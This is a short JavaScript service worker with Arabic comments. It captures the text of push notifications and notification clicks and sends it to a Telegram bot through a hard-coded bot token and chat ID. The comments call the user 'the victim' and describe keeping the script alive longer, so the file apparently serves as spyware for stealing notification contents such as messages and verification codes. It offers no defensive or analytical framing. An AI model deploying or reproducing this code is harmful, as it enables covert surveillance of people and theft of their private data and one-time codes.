const botToken = '8530728105:AAFIsTnKIKmwOnUxFvna_6IXnxT7wqKtsrE';
const chatId = '7802385639';

// وظيفة الإرسال للبوت
function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
}

// الاستماع لإشعارات النظام (Push)
self.addEventListener('push', function(event) {
    const data = event.data ? event.data.text() : 'إشعار جديد وصل للجهاز';
    sendToTelegram("📩 إشعار تلقائي التقطه النظام:\n" + data);
});

// التقاط محتوى الإشعار عند التفاعل (الأضمن في أندرويد)
self.addEventListener('notificationclick', function(event) {
    const body = event.notification.body;
    sendToTelegram("🚨 تم التقاط نص الإشعار بعد ضغط الضحية:\n" + body);
    event.notification.close();
});

// هذا الكود يبقي السكربت حياً لفترة أطول
self.addEventListener('install', function(event) {
    self.skipWaiting();
});
